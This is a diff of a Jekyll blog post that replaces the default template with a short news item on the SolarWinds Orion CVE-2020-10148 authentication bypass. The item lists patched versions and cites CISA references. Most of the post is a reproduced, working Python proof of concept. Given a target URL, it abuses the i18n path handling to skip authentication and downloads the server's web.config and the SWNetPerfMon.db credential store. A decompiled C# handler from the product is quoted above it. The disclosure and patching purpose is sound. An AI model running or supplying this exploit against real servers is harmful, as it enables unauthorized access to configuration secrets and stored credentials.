@@ -1,27 +1,162 @@
 ---
 layout: post
-title:  "Welcome to Jekyll!"
-date:   2016-06-13 10:51:47 +0530
-categories: jekyll update
-image: /images/image-1.png
+title:  "SolarWinds CVE-2020-10148 authentication bypass POC released."
+date:   2020-12-29 13:48:47 
+categories: news
+image: /images/solarwinds.png
 categories: [one, two]
 ---
-You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.
+Recently a user called `0xsha` on GitHub released a POC for Solarwinds authentication bypass which known as CVE-2020-10148. This bypass could allow a remote attacker to execute API commands which is basically a Remote Code Execution.
 
-To add new posts, simply add a file in the `_posts` directory that follows the convention `YYYY-MM-DD-name-of-post.ext` and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.
+This can be achieved by including specific parameters in the `Request.PathInfo` portion of a URI request.
 
-Jekyll also offers powerful support for code snippets:
+By appending `PathInfo` parameter, attacker can set the `SkipAuthorization` flag, and succesfully make API requests without any authentication.
 
-{% highlight ruby %}
-def print_hi(name)
-  puts "Hi, #{name}"
-end
-print_hi('Tom')
-#=> prints 'Hi, Tom' to STDOUT.
+Current updates about this security bug already released. Organizations should update the latest versions immediately.
+
+These are the latest versions that you can update;
+
+-2019.4 HF 6 
+-2020.2.1 HF 2
+-2019.2 SUPERNOVA Patch
+-2018.4 SUPERNOVA Patch
+-2018.2 SUPERNOVA Patch
+
+Here is the POC code:
+Credit: [0xsha's Github Page]: https://gist.github.com/0xsha/75616ef6f24067c4fb5b320c5dfa4965
+
+{% highlight python %}
+# CVE-2020-10148  (local file disclosure PoC for SolarWinds Orion aka door to SuperNova ? )
+# @0xSha 
+# (C) 2020 0xSha.io 
+
+# Advisory : https://www.solarwinds.com/securityadvisory
+# Mitigation : https://downloads.solarwinds.com/solarwinds/Support/SupernovaMitigation.zip
+# Details : https://kb.cert.org/vuls/id/843464
+
+# C:\inetpub\SolarWinds\bin\OrionWeb.DLL
+# According to SolarWinds.Orion.Web.HttpModules
+# in case of special strings this will set auth to null user and if case of ending with .i18n.ashx it will read the files
+'''
+private static void OnRequest(object sender, EventArgs e)
+		{
+			HttpApplication httpApplication = (HttpApplication)sender;
+			HttpContext context = httpApplication.Context;
+			string path = context.Request.Path;
+			if (path.IndexOf("Skipi18n", StringComparison.OrdinalIgnoreCase) >= 0)
+			{
+				if (context.User == null || !context.User.Identity.IsAuthenticated)
+				{
+					context.SkipAuthorization = true;
+					context.User = new NullUser();
+				}
+				return;
+			}
+			if (path.EndsWith(".css", StringComparison.OrdinalIgnoreCase) || path.EndsWith(".js", StringComparison.OrdinalIgnoreCase))
+			{
+				if (context.User == null || !context.User.Identity.IsAuthenticated)
+				{
+					context.SkipAuthorization = true;
+					context.User = new NullUser();
+				}
+				LocalizerHttpHandler.RedirectToMe(context, context.Request.Path);
+				return;
+			}
+			if (!path.EndsWith(".i18n.ashx"))
+			{
+				return;
+			}
+			string revisedFile = path.Substring(0, path.Length - ".i18n.ashx".Length);
+			string path2 = i18nRedirector.RebuildPath(context.Request.QueryString, revisedFile);
+			context.RewritePath(path2);
+		}
+
+        private static string RebuildPath(NameValueCollection nvc, string revisedFile)
+		{
+			return "/Orion/i18n.ashx?file=" + revisedFile + "&" + string.Join("&", (from x in nvc.AllKeys
+			where x != "file"
+			select x into key
+			select string.Format("{0}={1}", HttpUtility.UrlEncode(key), HttpUtility.UrlEncode(nvc[key]))).ToArray<string>());
+		}
+'''
+
+
+#/usr/local/bin/python3
+import requests
+import sys
+
+
+if len(sys.argv) < 2:
+    print ("[*] Usage : CVE-2020-10148.py http(s)://target")
+    exit(-1)
+
+if not(sys.argv[1].startswith("http://")):
+    if not(sys.argv[1].startswith("https://")):
+        print("[-] target starts either with http:// or https://")
+        exit(-1)
+
+
+print ("[*] Trying to leak valid file version")
+target = sys.argv[1]
+
+# appending .js to always invalid file 
+# we don't verify because of self-signed instances 
+# not really required but doesn't hurt either. 
+leakVersion = requests.get(target+"/Orion/invalid.aspx.js" ,verify=False)  
+
+if(leakVersion.headers["location"]):
+    print("[+] Got location header")
+    index = leakVersion.headers["location"].index(".i18n.ashx")
+    leakedVersion = (leakVersion.headers["location"][index:])
+    if (leakedVersion.__contains__("v=")):
+        print ("[+] Version seems valid")
+    else:
+        print("[-] Invalid version")
+        exit(-1)
+else:
+    print("[-] Can't get a valid version")
+    exit(-1)
+
+print("[*] Trying to leak web.config file ")
+#print(target+"/web.config"+leakedVersion)
+leakedConfig = requests.get(target+"/web.config"+leakedVersion, verify=False)
+#print(leakedConfig.status_code)
+
+if (leakedConfig.status_code == 200) and len(leakedConfig.text) > 1 :
+    print("[+] Target is vulnerable Got the web.config file ")
+    outputFile = target.replace("https://","").replace("http://","")+"_web.config"
+    configFile = open(outputFile,"w")
+    configFile.write(leakedConfig.text)
+    configFile.close() 
+    print("[+] web.config written to : " + outputFile )
+else:
+    print("[-] Failed to download web.config target is not vulnerable")
+    exit(-1)
+
+ 
+print("[*] Trying to leak SWNetPerfMon.db file (works only on older versions of orion) ")
+# https://support.solarwinds.com/SuccessCenter/s/article/Passwords-that-Orion-stores-locally-on-the-server?language=en_US
+# C:\inetpub\SolarWinds\SWNetPerfMon.db
+# C:\Program Files (x86)\SolarWinds\Orion\SWNetPerfMon.db
+
+leakedDB = requests.get(target+"/SWNetPerfMon.db"+leakedVersion, verify=False)
+
+if (leakedDB.status_code == 200) and len(leakedDB.text) > 1:
+    print("[+] Target is vulnerable Got the SWNetPerfMon.db file ")
+   
+    outputFile = target.replace("https://","").replace("http://","")+"_SWNetPerfMon.db"
+    configFile = open(outputFile,"w")
+    configFile.write(leakedDB.text)
+    configFile.close() 
+    # encrypted ? https://www.atredis.com/blog/2018/10/24/fun-with-the-solarwinds-orion-platform
+    print("[+] SWNetPerfMon.db written to : " + outputFile )
+else:
+    print("[-] Failed to download SWNetPerfMon.db target is on newer version")
+    exit(-1)
+
 {% endhighlight %}
 
-Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
+References;
 
-[jekyll-docs]: http://jekyllrb.com/docs/home
-[jekyll-gh]:   https://github.com/jekyll/jekyll
-[jekyll-talk]: https://talk.jekyllrb.com/
+https://us-cert.cisa.gov/ncas/current-activity/2020/12/13/active-exploitation-solarwinds-software
+https://cyber.dhs.gov/ed/21-01/
